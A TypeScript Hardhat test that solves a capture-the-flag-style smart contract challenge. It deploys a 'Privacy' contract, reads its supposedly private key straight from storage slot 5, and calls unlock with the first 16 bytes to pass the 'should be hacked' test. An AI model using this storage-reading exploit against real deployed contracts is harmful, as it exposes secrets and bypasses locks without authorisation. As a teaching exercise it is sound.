import { loadFixture, ethers, expect } from "./setup";

describe("Privacy contract", function() {
    async function deploy() {
		const owner = (await ethers.getSigners())[0];
        const attacker = (await ethers.getSigners())[1];

        const _bytes: BytesLike[3] = [ethers.encodeBytes32String("hello"), ethers.encodeBytes32String("ahahah"), ethers.encodeBytes32String("friend")]
        const factory = await ethers.getContractFactory("Privacy");
        const contract = await factory.deploy(_bytes);

        await contract.waitForDeployment();

        return {contract, owner};
    }

    it ("should be hacked", async function() {
        const {contract, owner} = await loadFixture(deploy);

        const value = await ethers.provider.getStorage(await contract.getAddress(), 5)
        const _bytes16 = value.slice(0, 34)

        expect(await contract.locked()).to.be.eq(true)
        await contract.unlock(_bytes16)
        expect(await contract.locked()).to.be.eq(false)
    });
})